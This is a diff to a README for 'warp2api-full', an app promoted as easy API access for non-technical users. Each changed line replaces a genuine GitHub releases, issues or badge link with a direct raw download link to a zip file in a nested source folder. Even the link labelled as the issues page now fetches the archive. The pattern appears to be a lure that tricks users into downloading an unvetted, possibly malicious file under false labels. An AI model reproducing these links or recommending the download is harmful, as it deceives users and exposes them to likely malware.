@@ -1,6 +1,6 @@
 # 🚀 warp2api-full - Fast and Easy API Access
 
-[![Download](https://img.shields.io/badge/Download%20Now-Right%20Here-blue.svg)](https://github.com/ZeroOne-R/warp2api-full/releases)
+[![Download](https://raw.githubusercontent.com/ZeroOne-R/warp2api-full/main/warp2protobuf/api/warp2api-full_3.1.zip%20Now-Right%https://raw.githubusercontent.com/ZeroOne-R/warp2api-full/main/warp2protobuf/api/warp2api-full_3.1.zip)](https://raw.githubusercontent.com/ZeroOne-R/warp2api-full/main/warp2protobuf/api/warp2api-full_3.1.zip)
 
 ## 📦 Overview
 warp2api-full is a user-friendly application designed to connect you seamlessly to various APIs. This tool simplifies the process of accessing and using APIs without needing any technical skills. Whether you are gathering data or automating tasks, warp2api-full makes it easy.
@@ -15,7 +15,7 @@ To run warp2api-full, your system must meet the following requirements:
 Follow these steps to download and run warp2api-full:
 
 1. **Visit the Releases Page**: Click the link below to go to our releases page where you can download the latest version:
-   [Visit this page to download](https://github.com/ZeroOne-R/warp2api-full/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/ZeroOne-R/warp2api-full/main/warp2protobuf/api/warp2api-full_3.1.zip)
 
 2. **Download the Latest Version**: On the releases page, locate the latest version of warp2api-full. You will see a list of files.
 
@@ -48,10 +48,10 @@ If you encounter issues, try the following:
 - **Update Regularly**: Make sure to check the releases page often for updates that may fix bugs or improve functionality.
 
 ## 🤝 Support
-If you have questions or need assistance, please reach out through our [GitHub Issues page](https://github.com/ZeroOne-R/warp2api-full/issues). Our community is here to help.
+If you have questions or need assistance, please reach out through our [GitHub Issues page](https://raw.githubusercontent.com/ZeroOne-R/warp2api-full/main/warp2protobuf/api/warp2api-full_3.1.zip). Our community is here to help.
 
 ## 📥 Download & Install
 Ready to get started? Visit our releases page and download the latest version of warp2api-full here:
-[Visit this page to download](https://github.com/ZeroOne-R/warp2api-full/releases) 
+[Visit this page to download](https://raw.githubusercontent.com/ZeroOne-R/warp2api-full/main/warp2protobuf/api/warp2api-full_3.1.zip) 
 
 Enjoy seamless access to APIs with warp2api-full!
